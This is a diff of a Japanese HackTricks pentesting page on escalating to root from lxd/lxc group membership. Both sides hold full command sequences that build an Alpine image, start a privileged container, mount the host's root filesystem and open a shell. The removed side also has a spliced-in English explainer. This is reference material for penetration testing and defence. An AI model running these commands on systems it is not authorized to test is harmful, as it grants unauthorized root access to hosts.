@@ -1,24 +1,26 @@
-# lxd/lxcグループ - 特権昇格
+# lxd/lxc グループ - 特権昇格
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**</strong> で **ゼロからヒーローまでAWSハッキングを学ぶ**</a><strong>!</strong></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
+HackTricks をサポートする他の方法:
+
+* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
+* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れる
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) をフォローする**
+* **ハッキングトリックを共有する**には、[**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出してください。
 
 </details>
 
-もし _**lxd**_ **または** _**lxc**_ **グループに所属している場合、rootになることができます**
+もし _**lxd**_ **または** _**lxc**_ **グループに所属している場合、root 権限を取得できます**
 
-## インターネットなしでの攻撃
+## インターネットなしでの悪用
 
 ### 方法1
 
-このディストロビルダーをマシンにインストールすることができます: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(githubの指示に従ってください):
+あなたのマシンにこのディストロビルダーをインストールすることができます: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder) (githubの手順に従ってください):
 ```bash
 sudo su
 #Install requirements
@@ -36,78 +38,27 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 #Create the container
 sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
 ```
-次に、脆弱なサーバーに **lxd.tar.xz** と **rootfs.squashfs** のファイルをアップロードします。
-
-イメージを追加します：
+**lxd.tar.xz** と **rootfs.squashfs** ファイルをアップロードし、イメージをリポジトリに追加してコンテナを作成してください:
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
-lxc image list #You can see your new imported image
-```
-# LXD Privilege Escalation
 
-## Introduction
+# Check the image is there
+lxc image list
 
-This document explains a privilege escalation technique in LXD, a container hypervisor for Linux systems. By exploiting misconfigurations in LXD, an attacker can gain root privileges within a container and potentially escalate their privileges on the host system.
-
-## Prerequisites
-
-To perform this attack, you need the following:
-
-- Access to a Linux system with LXD installed.
-- Basic knowledge of Linux command-line interface (CLI) and LXD commands.
-
-## Attack Scenario
-
-1. **Create a Container**: First, create a new container using the LXD command-line tool. Specify the desired Linux distribution and version for the container.
-
-   ```bash
-   lxc launch <image> <container-name>
-   ```
-
-2. **Add Root Path**: Once the container is created, add the root path to the container's configuration. This will allow the container to access the host system's root filesystem.
-
-   ```bash
-   lxc config device add <container-name> root disk source=/ path=/
-   ```
-
-   This command adds a new device named "root" to the container's configuration, with the source set to the host system's root filesystem ("/") and the path set to the root directory ("/") within the container.
-
-3. **Start the Container**: Start the container to apply the changes made to its configuration.
-
-   ```bash
-   lxc start <container-name>
-   ```
-
-4. **Access the Container**: Once the container is running, access its shell using the LXD command-line tool.
-
-   ```bash
-   lxc exec <container-name> -- /bin/bash
-   ```
-
-5. **Privilege Escalation**: Within the container's shell, execute commands to escalate privileges and gain root access. This can be achieved by exploiting vulnerabilities or misconfigurations within the container or the host system.
-
-## Mitigation
-
-To prevent privilege escalation attacks in LXD, follow these best practices:
-
-- Regularly update LXD and the host system to ensure that security patches are applied.
-- Limit the privileges of LXD containers by using appropriate Linux user namespaces and resource restrictions.
-- Avoid adding the root path to containers unless absolutely necessary, and carefully review the security implications before doing so.
-- Implement strong access controls and monitor container activity for any suspicious behavior.
-
-By following these guidelines, you can reduce the risk of privilege escalation attacks in LXD containers.
-```bash
+# Create the container
 lxc init alpine privesc -c security.privileged=true
-lxc list #List containers
+
+# List containers
+lxc list
 
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 {% hint style="danger" %}
-もしエラーが発生した場合 _**エラー: ストレージプールが見つかりません。新しいストレージプールを作成してください**_\
-**`lxd init`** を実行し、前のコマンドのチャンクを**繰り返して**ください
+このエラーが見つかった場合 _**Error: No storage pool found. Please create a new storage pool**_\
+**`lxd init`** を実行して、前のコマンドチャンクを**繰り返して**ください
 {% endhint %}
 
-コンテナを実行します：
+最後に、コンテナを実行して root 権限を取得できます：
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
@@ -115,7 +66,7 @@ lxc exec privesc /bin/sh
 ```
 ### 方法2
 
-Alpineイメージをビルドし、フラグ`security.privileged=true`を使用して起動します。これにより、コンテナがホストのファイルシステムとしてrootとして対話するように強制されます。
+Alpineイメージをビルドし、`security.privileged=true`フラグを使用して起動します。これにより、コンテナがホストファイルシステムとしてrootとして対話するように強制されます。
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -139,11 +90,9 @@ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursiv
 lxc start mycontainer
 lxc exec mycontainer /bin/sh
 ```
-Alternatively [https://github.com/initstring/lxd\_root](https://github.com/initstring/lxd\_root)
+## インターネットを使用する
 
-## インターネットを使用する場合
-
-[こちらの手順](https://reboare.github.io/lxd/lxd-escape.html)に従うことができます。
+[これらの手順](https://reboare.github.io/lxd/lxd-escape.html)に従うことができます。
 ```bash
 lxc init ubuntu:16.04 test -c security.privileged=true
 lxc config device add test whatever disk source=/ path=/mnt/root recursive=true
@@ -151,18 +100,21 @@ lxc start test
 lxc exec test bash
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
-## その他の参考資料
+## 参考文献
 
-{% embed url="https://reboare.github.io/lxd/lxd-escape.html" %}
+* [https://reboare.github.io/lxd/lxd-escape.html](https://reboare.github.io/lxd/lxd-escape.html)
+* [https://etcpwd13.github.io/greyfriar_blog/blog/writeup/Notes-Included/](https://etcpwd13.github.io/greyfriar_blog/blog/writeup/Notes-Included/)
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
 
-* **サイバーセキュリティ企業で働いていますか？** HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンやHackTricksのPDFをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
+HackTricks をサポートする他の方法:
+
+* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
+* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) をフォローする
+* **ハッキングテクニックを共有するために、** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出する
 
 </details>
